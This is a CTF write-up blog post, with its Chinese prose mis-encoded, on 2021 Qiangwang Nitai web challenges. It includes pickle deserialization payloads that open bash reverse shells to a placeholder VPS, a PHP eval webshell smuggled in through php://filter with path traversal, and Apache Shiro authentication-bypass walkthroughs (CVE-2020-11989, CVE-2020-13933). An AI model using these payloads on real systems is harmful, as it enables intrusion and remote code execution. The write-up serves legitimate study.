---
title: "2021å¼ºç½‘æ‹Ÿæ€ Wp"
slug: "qwnt2021-wp"
description: "æ²¡å•¥å¯æè¿°çš„ï¼Œå°±æ˜¯ä¸€ä»½æ™®æ™®é€šé€šçš„wp~"
date: 2021-10-26T20:17:24+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

> webæœ‰3ä¸ªéƒ½æ˜¯æœ‰äº†åŒ…æµ†çš„åŸé¢˜â€¦â€¦è¿˜æœ‰ä¸€ç‚¹è„‘æ´é¢˜ï¼Œåæ­£å¥‡å¥‡æ€ªæ€ªçš„
>
> å±äºæ˜¯è¢«å¸ˆå‚…ä»¬å¸¦é£äº†ï¼Œæ‰€ä»¥è¯¦ç»†çš„wpè¿˜æ˜¯è‡ªå·±å†™ä¸€å†™ï¼Œè®¤çœŸåœ°å¤ç°ä¸€ä¸‹

## zerocalc

![image-20211024031549328](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024031549328.png)

emmmmmm è¯´å®è¯ä¸€å¼€å§‹æ²¡æœ‰å‡º å› ä¸ºæ²¡æ‚Ÿå‡ºæ¥å®ƒè¿™æ˜¯ä¸ªä»€ä¹ˆé€»è¾‘2333333

## ezPickle

```
# ç”¨pker.pyç”Ÿæˆpayload
notadmin=GLOBAL('config','notadmin')
notadmin["admin"]="yes"
exec=GLOBAL('config','backdoor')
payload='''__import__('subprocess').call(\"echo -e '#!/bin/bash\\nsh -i >& /dev/tcp/you_vps_ip/port 0>&1'>x && bash x && rm -rf x\",shell=True)'''
exec(payload)
return
```

```python
>>> data=b'cconfig\nnotadmin\np0\n0g0\nS\'admin\'\nS\'yes\'\nscconfig\nbackdoor\np2\n0S\'__import__(\\\'subprocess\\\').call("echo -e \\\'#!/bin/bash\\\\nsh -i >& /dev/tcp/you_vps_ip/port 0>&1\\\'>x && bash x && rm -rf x",shell=True)\'\np3\n0g2\n(g3\ntR.'
>>> print(base64.b64encode(data))
b'xxxxxxxxxx'
```

![image-20211023215957693](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023215957693.png)

æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼ŒåŸºç¡€çš„pickleé¢˜ï¼Œæ˜¯2021å·…å³°æå®¢what_pickleçš„é˜‰å‰²ç‰ˆï¼ˆæ„é€ çš„æ€è·¯å‡ ä¹ä¸€æ · ä½†æ˜¯ç®€å•å¾ˆå¤šï¼‰ï¼Œå‡ ä¹ä¸€æ ·çš„é¢˜ç›®è¿˜æœ‰ [SUCTF 2019]Guess Game

é™åˆ¶çš„ç‚¹åœ¨äº<u>[åªå…è®¸å¼•å…¥é¢˜ç›®è‡ªè®¾æ¨¡å—&é™åˆ¶æ¨¡å—ä¸­å«ä¸‹åˆ’çº¿](https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/#--%E4%BB%85%E5%8F%AF%E4%BB%A5%E5%BC%95%E5%85%A5%E9%A2%98%E7%9B%AE%E4%B8%AD%E8%87%AA%E8%AE%BE%E7%9A%84%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%9D%97%E5%90%8D%E4%B8%8D%E8%83%BD%E6%9C%89__%E7%AC%A6)</u>ï¼Œé‚£å°±ç›´æ¥å˜é‡è¦†ç›–ï¼Œç„¶ååˆ©ç”¨ç»™å‡ºçš„`eval()`å¼¹shellå°±å¥½äº†

â€”â€”â€”â€”å¦å¤–è¿™é‡Œçš„payloadä¹Ÿå¯ä»¥æ˜¯ç®€çŸ­ç‰ˆæœ¬çš„å¼¹sehllçš„payload ä¸å”¯ä¸€å˜›

```python
data = b'cconfig\nnotadmin\np0\n0g0\nS\'admin\'\nS\'yes\'\nscconfig\nbackdoor\np2\n0S\'__import__("os").system("bash -c \\\'exec bash -i &>/dev/tcp/you_vps_ip/port <&1\\\'")\'\np3\n0g2\n(g3\ntR.'
```

ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºè¿™é‡Œçš„ååºåˆ—åŒ–å…¥å£æ˜¯getä¼ å‚ï¼Œæ‰€ä»¥é‡åˆ°+å·ä¼šå‡ºé—®é¢˜ï¼Œä¼ è¿›å»ä¹‹å‰è¦å…ˆurlencode(encode all special chars)

â€”â€”â€”â€”é¡ºå¸¦ç»ƒä¸ªæ‰‹ï¼Œæ“ä¸€ä¸ªä¸å«`b'R'`çš„opcodeï¼ˆç”¨`b'o'`ä»£æ›¿ï¼‰

```python
data = b'''cconfig\nnotadmin\np0\n0g0\nS\'admin\'\nS\'yes\'\nscconfig\nbackdoor\np2\n0S\'__import__("os").system("bash -c \\\'exec bash -i &>/dev/tcp/you_vps_ip/port <&1\\\'")\'\np3\n0(g2\ng3\no.'''
```

ä¼ å‚çš„æ—¶å€™è®°å¾—å†urlencodeä¸€ä¸‹~~~

â€”â€”â€”â€”ä¹‹å‰æˆ‘çš„[æ€»ç»“ç¬”è®°](https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/)å·²ç»ç›¸å½“å…¨é¢äº† ~~å¯ä»¥å‡ºCTFæ•™ç§‘ä¹¦äº†233333~~

## Jack-Shiro

å±äºæ˜¯åŸé¢˜äº†å±äºæ˜¯å±äºæ˜¯å±äºæ˜¯çƒ¤çƒ‚äº†å·²ç»ï¼Œå‚è§ [[çº¢æ˜è°·CTF 2021] JavaWeb](https://www.zhaoj.in/read-6859.html#WEB1_javaweb)  |  [[å¤©ç¿¼æ¯ 2021] jackson](https://www.huamang.xyz/index.php/archives/99/)  |  [[NPUCTF2020] EzShiro](https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro) ~~ï¼ˆè™½ç„¶æˆ‘è‡ªå·±æ ¹æœ¬æ²¡å‘ç° å®åœ¨æ˜¯åšè¿‡çš„é¢˜å¤ªå°‘äº† javaæ›´æ˜¯ä¸ä¼š æˆ‘çš„~~

/loginä¸‹æœ‰ä¸ªç™»å½•ï¼Œå›æ˜¾/jsonï¼Œè¿”å›çš„cookieæœ‰ä¸ªrememberMe=deleteMeï¼Œå¯ä»¥çŸ¥é“æ˜¯shiro

è®¿é—®/jsonï¼Œåé¢ä¼šå¸¦ä¸€å †getè¯·æ±‚çš„å‚æ•°ï¼Œç”¨/;/jsonç»•è¿‡ï¼ˆcve-2020-11989ï¼‰

ä¸Šå·¥å…·[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)ä¸€æŠŠæ¢­ï¼ˆé—®é¢˜å‡ºåœ¨æˆ‘vpsä¸Šæ²¡æœ‰javaç¯å¢ƒ ç«¯å£è½¬å‘åˆå¤„äº†äº¿ç‚¹ç‚¹é—®é¢˜â€¦â€¦ æ‰€ä»¥æ²¡æœ‰å¸¦å‡ºæ¥flagï¼‰ï¼Œæ˜¯cve-2020-36188

![image-20211024041750586](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024041750586.png)

å“­å“­

è¿˜æœ‰ä¸ªå·¥å…·æ˜¯ [LdapBypassJndi](https://github.com/Firebasky/LdapBypassJndi)ï¼Œå·®ä¸å¤šçš„ï¼›ä¸‹é¢æ˜¯è·Ÿä¸€è·Ÿæ¶‰åŠåˆ°çš„å‡ ä¸ªé“¾å­

### CVE-2020-11989

å‚è€ƒï¼š[Apache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989)](https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA)  |  [Apache Shiro èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ (CVE-2020-11989)](https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/)

Apache Shiroæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„javaå®‰å…¨æ¡†æ¶ï¼Œåœ¨1.5.3ä¹‹å‰ç‰ˆæœ¬ä¸­å½“Shiroä¸SpringåŠ¨æ€æ§åˆ¶å™¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼ˆSpringæ¡†æ¶ä¸­åªç”¨Shiroé‰´æƒï¼‰ï¼Œå¦‚æœç›´æ¥è®¿é—®/shiro/admin/pageä¼š302è·³è½¬è¦æ±‚ç™»å½•ï¼Œè€Œè®¿é—®/;shiro/admin/pageå³å¯ç»•è¿‡æƒé™éªŒè¯ï¼Œè®¿é—®/adminçš„ä¿¡æ¯

#### æœ¬åœ°ç¯å¢ƒæ­å»º&å¤ç°

æœ‰å¸¦ä½¬ç›´æ¥å†™å¥½çš„dockerå¯ä»¥ç›´æ¥pullæ‹¿æ¥ç”¨

```
docker pull jackey0/cve-2020-11989
docker run -p 8426:8080 <image> /bin/sh -c 'java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar'
docker pull jackey0/cve-2020-13933
// docker start <container-id>
```

æˆ–è€…ä¸‹è½½[l3yx/springboot-shiro](https://github.com/l3yx/springboot-shiro)é¡¹ç›®åˆ°æœ¬åœ°ç¼–è¯‘ä¸ºwaråŒ…ï¼ˆæˆ–è€…ä¹Ÿæœ‰ç¼–è¯‘å¥½çš„[shiro.war](https://github.com/backlion/demo/blob/master/shiro.war)ï¼‰ä¹‹åæ‰‹åŠ¨æ”¾å…¥tomcatä¸‹çš„webappsç›®å½•ä¸‹è¿è¡Œã€‚æ˜¾ç„¶dockerå¤ªé¦™äº†ï¼ï¼ï¼ï¼ï¼

![image-20211025224051899](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224051899.png)

è®¿é—®æ˜ å°„åˆ°å¤–éƒ¨çš„8426ç«¯å£ï¼Œç¯å¢ƒæ­å»ºå®Œæ¯•

![image-20211025224115269](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025224115269.png)

postæ–¹å¼è¯·æ±‚/doLoginé¡µé¢ï¼Œçœ‹åˆ°cookieä¸­å«rememberMe=deleteMeï¼Œç¡®å®šä¸ºshiro

è®¿é—®/admin/pageé¡µé¢ï¼Œ302é‡å®šå‘è‡³/loginé¡µé¢è¦æ±‚ç™»å½•

![image-20211025232735464](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232735464.png)

è®¿é—®/;/admin/pageé¡µé¢ï¼Œç»•è¿‡é‰´æƒï¼Œå›æ˜¾admin page

![image-20211025232717422](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211025232717422.png)

#### æºç åˆ†æ&åŠ¨è°ƒ

å…ˆæŠŠjaråŒ…ä¸‹è½½åˆ°åœ¨æœ¬åœ°ï¼Œå¯¼å…¥idea

```
docker cp <container-id>:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/
```

ä½¿ç”¨ideaè¿œç¨‹å¯¹dockerä¸­éƒ¨ç½²çš„springbooté¡¹ç›®è¿›è¡Œdebug

![image-20211026033544920](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026033544920.png)

```
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456  /springboot-shiro-0.0.1-SNAPSHOT.jar'
```

Shiroçš„æƒé™æ ¡éªŒæ˜¯é€šè¿‡åˆ¤æ–­urlçš„åŒ¹é…æ¥è¿›è¡Œçš„ï¼Œå¦‚æœShiroè·å–çš„urlå’Œwebæ¡†æ¶å¤„ç†çš„urlç»“æœä¸ä¸€è‡´æ—¶å°±é€ æˆäº†æƒé™ç»•è¿‡ï¼›Shiroå¯¹äºurlçš„è·å–å’ŒåŒ¹é…åœ¨`org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain`ä¸­è¿›è¡Œã€‚

ä»¥è®¿é—®/;/admin/pageä¸ºä¾‹ï¼Œé€šè¿‡å®ƒçš„`getPathWithinApplication()`å¾—åˆ°çš„requestURI="/"

![image-20211026105323534](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026105323534.png)

è·Ÿå…¥æ­¤å‡½æ•°çš„å¤„ç†é€»è¾‘`org.apache.shiro.web.util.WebUtils#getPathWithinApplication`ï¼Œè¿›å…¥`getRequestUri()`

![image-20211026113806371](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026113806371.png)

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ä¸­é—´è¿‡ç¨‹ä¸­uri="/;/admin/page"ï¼Œä½†æ˜¯ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡`normalize(decodeCleanUriString())`å¤„ç†è¿‡åè¿”å›çš„requestRUI="/"ï¼Œè·Ÿå…¥è¿™ä¸ªå‡½æ•°ï¼Œå®ƒå…ˆæ˜¯è°ƒç”¨`decodeRequestSrting()`ï¼Œæ²¡æœ‰å¯¹ç»“æœäº§ç”Ÿä»€ä¹ˆå½±å“ï¼Œ

![image-20211026114857281](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026114857281.png)

è€Œè¿”å›æ—¶çš„`normalize()`ä¼šæ ¹æ®";"è¿›è¡Œurlçš„æˆªæ–­å¤„ç†ï¼Œæœ€ç»ˆè¿”å›"/"

å›åˆ°å¼€å¤´çš„/;/admin/pageè¯·æ±‚ï¼Œspringä¸­å¤„ç†urlçš„å‡½æ•°åœ¨`org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping`

![image-20211026115653673](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115653673.png)

å®ƒè°ƒç”¨çš„æ˜¯springframeworkä¸­è‡ªå·±`getPathWithinApplication()`ï¼Œç»è¿‡ä¸€ç•ªéªšæ“ä½œè¿”å›çš„æ˜¯/admin/page

![image-20211026115916664](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026115916664.png)

è·Ÿå…¥`getPathWitinApplication()`ï¼Œå…ˆæ˜¯è°ƒç”¨`getContextPath()`ï¼Œè¿”å›"/"

![image-20211026120922475](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026120922475.png)

ç„¶åæ˜¯`getRequestUri()`

![image-20211026121402778](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121402778.png)

åŒæ ·ï¼Œåœ¨æœ€ç»ˆreturnä¹‹å‰çš„uri="/;/admin/page"ï¼Œç»è¿‡äº†ä¸€ä¸ª`decodeAndCleanUriString()`ï¼Œæ ¹æ®ch=59ä¹Ÿå°±æ˜¯";"ç¬¦è¿›è¡Œä¸€ä¸ªåˆ†å‰²ï¼Œä½¿ç”¨`removeSemicolonContentInternal()`

![image-20211026121749767](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026121749767.png)

äºæ˜¯";"å°±ä¸è§äº†

![image-20211026122016422](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122016422.png)

![image-20211026122121074](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122121074.png)

ç„¶åè¿”å›"/admin/page"ç»™`getPathWithinApplication()`

![image-20211026122204403](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122204403.png)

å†ä¼ é€’ç»™`getPathWithinServletMapping()`

![image-20211026122355835](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026122355835.png)

æœ€ç»ˆæˆ‘ä»¬è®¿é—®åˆ°çš„é¡µé¢å°±æ˜¯"/admin/page"äº†

â€”â€”â€”â€”æ€»ç»“ä¸€ä¸‹å°±æ˜¯å½“urlåœ¨shiroå’Œspringä¸­çš„å¤„ç†ä¸ä¸€è‡´ï¼Œå½“è¿›å…¥åº”ç”¨æ—¶è¢«è®¤ä½œæ˜¯è®¿é—®"/;/admin/page"ï¼Œä¸å±äºæˆ‘ä»¬æœ€åˆé…ç½®çš„"/admin/*"æƒé™è·¯ç”±ï¼Œè€Œè¿›å…¥shiroåå´è¢«æˆªæ–­å¤„ç†ï¼Œè®¤ä½œæ˜¯"/admin/page"ï¼Œå±äºæƒé™è·¯ç”±ä¸­ï¼Œæœ€ç»ˆåšåˆ°æƒé™ç»•è¿‡

### CVE-2020-13933

ç”±äº11989çš„ä¿®è¡¥å¹¶ä¸å®Œå…¨ï¼Œå¯¼è‡´åˆåˆåˆè¢«ç»•è¿‡äº§ç”Ÿäº†13933â€¦â€¦

#### æœ¬åœ°ç¯å¢ƒæ­å»º&å¤ç°

å‚è€ƒï¼š[shiro < 1.6.0çš„è®¤è¯ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-13933)](https://www.anquanke.com/post/id/214964#h2-3)

è¿˜æ˜¯é‡‡ç”¨dockerå½¢å¼å¤ç°ï¼ˆæˆ‘çˆ±dockerï¼‰è¿™é‡Œç›´æ¥å°±æ˜¯è¿œç¨‹è°ƒè¯•çš„å¯åŠ¨å‘½ä»¤å•¦ï¼Œè·Ÿä¸Šé¢çš„ä¸€æ ·é…ç½®å°±å¥½äº†ï¼ˆ

```
docker pull jackey0/cve-2020-13933
docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c 'java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456  /springboot-shiro-0.0.1-SNAPSHOT.jar'
```

è®¿é—®/adminï¼ŒæŠ¥é”™é¡µé¢ä¸”æ— 302è·³è½¬ï¼›è®¿é—®/loginè·³è½¬åˆ°èº«ä»½éªŒè¯é¡µé¢ï¼›è®¿é—®/admin/%3bpageï¼Œæ— èº«ä»½éªŒè¯ä¸”è¿”å›admin page

![image-20211026171901636](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026171901636.png)

#### åŸç†åˆ†æ&åŠ¨è°ƒ

è¿˜æ˜¯å¯¼å…¥jaråŒ…è‡³ideaï¼Œè¿œç¨‹debug

ç›´æ¥çœ‹çœ‹shiro1.6.0çš„è¡¥ä¸è¡¥åˆ°äº†ä»€ä¹ˆåœ°æ–¹ï¼Œåœ¨githubä¸ŠæŸ¥çœ‹[diff](https://github.com/apache/shiro/compare/shiro-root-1.5.3...shiro-root-1.6.0)

![image-20211026175139677](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026175139677.png)

å¢åŠ äº†`InvalidRequestFilter`ç±»ï¼Œæœ‰ä¸ª`isAccessAllowed()`å‡½æ•°ï¼Œåœ¨å…¨å±€ä¸Šå¯¹åˆ†å·ã€åæ–œæ ã€éASCIIç å­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤

ä»¥è®¿é—®/admin/%3bpageä¸ºä¾‹ï¼Œurlå…ˆç”±shiroè§£æï¼Œè¿˜æ˜¯`org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain`ï¼Œä¾æ—§æ˜¯è°ƒç”¨`getPathWithinApplication()`ï¼Œæ‰§è¡ŒårequestURI="/admin/"

![image-20211026181015088](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181015088.png)

è€Œä¹‹åè¿›å…¥springbootå¤„ç†æ—¶ï¼Œå´å˜æˆäº†"/admin/;page"

![image-20211026181252374](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026181252374.png)

å†å›åˆ°æœ€åˆè·Ÿä¸€ä¸‹å…·ä½“çš„è°ƒç”¨é“¾

![image-20211026182540363](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182540363.png)

åœ¨`removeSemicolon()`å¤„ç†å‰ï¼Œuri="/admin/;page"ï¼ˆç»`decodeAndUriString()`è§£ç äº†ï¼‰

![image-20211026182711164](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026182711164.png)

å¤„ç†åpath="/admin"ï¼Œæ¥ç€è°ƒç”¨`normalize()`å‡½æ•°å˜æˆ"/admin"ï¼Œä¼ é€’ç»™æœ€åˆçš„`getChain()`ä¸­çš„requestURIå‚æ•°

![image-20211026183041350](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183041350.png)

ä¹‹åè¢«springå¤„ç†`org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping`ï¼Œå…¶ä¸­ä¼šè°ƒç”¨`getRequestUri()`ï¼Œå®ƒä¼šå†æ¬¡è°ƒç”¨`decodeAndCleanUriString()`

![image-20211026183542060](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026183542060.png)

å…ˆ`removeSemicolonContent()`å†`decodeRequestString()`ï¼Œé‚£æ˜¾ç„¶æ˜¯æ€ä¹ˆéƒ½å»ä¸æ‰";"äº†ï¼Œå°†";page"çœ‹ä½œä¸€ä¸ªæ•´ä½“

![image-20211026184529505](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026184529505.png)

æˆ‘ä»¬å›è¿‡å¤´å»çœ‹è¿™æ¬¡çš„æƒé™è®¾ç½®æ˜¯æ€ä¹ˆåŒ¹é…urlçš„ï¼Œå®šä½åˆ°`org.syclover.srpingbootshiro.LoginController`å’Œ`org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean`

![image-20211026190414964](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190414964.png)

![image-20211026190401468](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211026190401468.png)

å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº"/admin/*"éœ€è¦é‰´æƒï¼Œ"/admin/{name}"è¿”å›admin pageï¼Œè€Œå¯¹äº"/admin/"å´æ²¡æœ‰è®¾ç½®æƒé™

ä»ä¸Šé¢çš„è°ƒè¯•ä¸­æˆ‘ä»¬çŸ¥é“shiroå¾—åˆ°çš„æ˜¯"/admin/"ï¼ˆå…ˆdecodeå†å»é™¤";"ï¼‰ï¼Œè¢«è®¤ä½œå¯ä»¥è®¿é—®ï¼›è€Œspringå¾—åˆ°çš„æ˜¯"/admin/;page"ï¼‰å…ˆå»é™¤";"å†decodeï¼‰ï¼Œä¸"/admin/{name}"çš„æ ·å¼åŒ¹é…ï¼Œæœ€åè¿”å›admin  page ~~ï¼ˆç®€ç›´å¤ªå®Œç¾äº†ä¹Ÿ~~

#### *ä¸´æ—¶ä¿®å¤

ï¼ˆæœ¬åœ°æš‚æ—¶è¿˜æœªå¤ç°

```
map.put("/admin/**", "authc");
@GetMapping({"/admin/page"})
    public String admin() {
        return "admin page";
    }
```

### ***CVE-2020-36188

`ch.qos.logback.core.db.JNDIConnectionSource`

å¯ä»¥å‚è€ƒ https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiroï¼Œå·¥å…· [LdapBypassJndi](https://github.com/Firebasky/LdapBypassJndi)  |  [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)

â€”â€”â€”â€”ç”±äºæˆ‘çš„javaæ°´å¹³å®åœ¨å¤Ÿå‘›ï¼Œè¿™é‡Œæš‚æ—¶å…ˆç©ºç€ï¼Œç­‰æˆ‘å­¦ä¸€å­¦java ä¹‹åå¿…å®šå›æ¥é­å°¸

## EasyFilter

```php
<?php
    ini_set("open_basedir","./");
    if(!isset($_GET['action'])){
        highlight_file(__FILE__);
        die();
    }
    if($_GET['action'] == 'w'){
        @mkdir("./files/");
        $content = $_GET['c'];
        $file = bin2hex(random_bytes(5));
        file_put_contents("./files/".$file,base64_encode($content));
        echo "./files/".$file;
    }elseif($_GET['action'] == 'r'){
        $r = $_GET['r'];
        $file = "./files/".$r;
        include("php://filter/resource=$file");
    }
```

```
/?action=w&c=<?php @eval($_POST['wuhu']);?>
```

```
/?action=r&r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
POST: wuhu=phpinfo();
```

![image-20211023214748589](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png)

### å¯¹äºpayloadçš„åº•å±‚ä»£ç åˆ†æ

åŸç†åˆ†ææ¥è‡ªGuokeä½¬ æˆ‘åªæ˜¯ä¸ªä¼šå¤ç°çš„é“æ²¸ç‰©â€¦â€¦

é¦–å…ˆä¸‹ä¸€ä»½7.2.34çš„æºç 

å®šä½åˆ°åŒ…è£…å™¨æ‰€åœ¨çš„æ–‡ä»¶ä½ç½®/ext/standard/php_fopen_wrapper.cï¼Œ178è¡Œèµ·æ˜¯php_stream_url_wrap_php()çš„ä»£ç 

![image-20211024210116402](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png)

191è¡Œï¼Œå…ˆç¢°åˆ°`php://`ä¼šæ‰§è¡Œ`path += 6`ï¼›ä¹‹åæ¥ç€349è¡Œä¼šç¢°åˆ°`filter/`

![image-20211024210420398](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png)

æ²¡æœ‰modeï¼Œæ­¤æ—¶

```
path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
```

357è¡Œæ‰§è¡Œstrdup()ï¼ŒæŠŠpathç¬¬6ä½ä¹‹åçš„å†…å®¹èµ‹ç»™pathdupæŒ‡é’ˆä¸Š

```
pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
```

358è¡Œstrstr()è¿”å›pathdupçš„æŒ‡é’ˆä¸­/resource=å‡ºç°çš„ä½ç½®ï¼Œåˆ°365è¡Œçš„åˆ¤æ–­

```
p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
```

372è¡Œçš„php_strtok_r()å¯¹pathdup+1çš„ä½ç½®ä»¥'/'ä¸ºæ ‡å¿—è¿›è¡Œåˆ†å‰²

```
p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
```

å¾—åˆ°resource=ï¼Œè¿›373è¡Œçš„whileå¾ªç¯ï¼Œå…ˆæ˜¯åˆ°378è¡Œçš„php_stream_apply_filter_list()ï¼Œè½¬è‡³159è¡Œ

![image-20211024230730886](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png)

 å°†pä½œä¸ºè¿‡æ»¤å™¨è¿›è¡Œæ³¨å†Œï¼Œ161è¡Œphp_stream_filter_append()åº”ç”¨åˆ°æ–‡ä»¶æµä¸Šï¼Œä½†æ˜¾ç„¶resourceä¸æ˜¯æµåŒ…è£…å™¨ï¼Œå¹²ä¸äº†äº‹ï¼Œé‚£å°±å†åˆ°whileå¾ªç¯é‡Œæ¥ç€å‘åæ‰¾ï¼Œç›´åˆ°å‘åç¢°åˆ°read

```
p=/read=convert.base64-decode/resource=/../../../../../1.txt
```

è¿›å…¥374è¡Œï¼Œæ‰§è¡Œphp_stream_apply_filter_listä¹‹åå°±å˜æˆäº†

```
p=convert.base64-decode/resource=/../../../../../1.txt
```

æ­¤æ—¶çš„p=convert.base64-decodeï¼Œå°±å¯ä»¥æ­£å¸¸çš„b64è§£ç æˆ‘ä»¬çš„å†…å®¹äº†


### å†å›å¤´çœ‹è¿™ä¸ªé¢˜

ä»£ç å¾ˆçŸ­ï¼Œé™åˆ¶åœ¨äºå†™å…¥çš„æ–‡ä»¶å†…å®¹è¢«b64åŠ å¯†&open_basedir&includeå·²ç»å†™å¥½çš„åŒ…è£…å™¨å’Œä¸€éƒ¨åˆ†å›ºå®šçš„å†…å®¹

æˆ‘åˆšå¼€å§‹å¡åœ¨äº†å·²ç»å†™æ­»çš„åŒ…è£…å™¨çš„å¼€å¤´è¿˜æ€ä¹ˆåŠ conver.base64-decodeï¼Ÿç„¶åå‘ç°æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œå¯ä»¥æ¥ç€å¥—ï¼Œåº•å±‚åŸç†è§ä¸Šï¼Œä¼šå‘åå¾ªç¯å–å€¼ç›´åˆ°ç¢°åˆ°ä¸€ä¸ªæ­£å¸¸çš„æµåŒ…è£…å™¨

ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç›®å½•ç©¿è¶Šäº†ï¼Œå‰é¢åŠ äº†5å±‚buffï¼Œä»ç»“æœå€’æ¨æ„Ÿè§‰å¯ä»¥ç†è§£ï¼Œä½†æ˜¯è‡ªå·±å´æ²¡è¯•å‡ºæ¥ï¼Œæˆ‘çš„é—®é¢˜

æœ€åopen_basedirçš„ç»•è¿‡åè€Œæ˜¯æœ€è½»æ¾çš„ï¼Œèšå‰‘æ’ä»¶ç›´æ¥æ

å‚è€ƒï¼š[æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº](https://www.laruence.com/2010/05/04/1450.html)  |  [Exploit with PHP Protocols / Wrappers](https://www.cdxy.me/?p=752)  |  [è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)

## new_hospital

å“åº”cookieä¼šæœ‰ä¸ªAPI

![image-20211023225411779](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png)

å°†APIè®¾ä¸ºflag.php  `ZmxhZy5waHA%3d`

![image-20211023230544476](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png)

æ‰«ç›®å½• å¾—åˆ°/old/feature.php å°†è·¯å¾„æ”¹ä¸ºè¿™ä¸ª

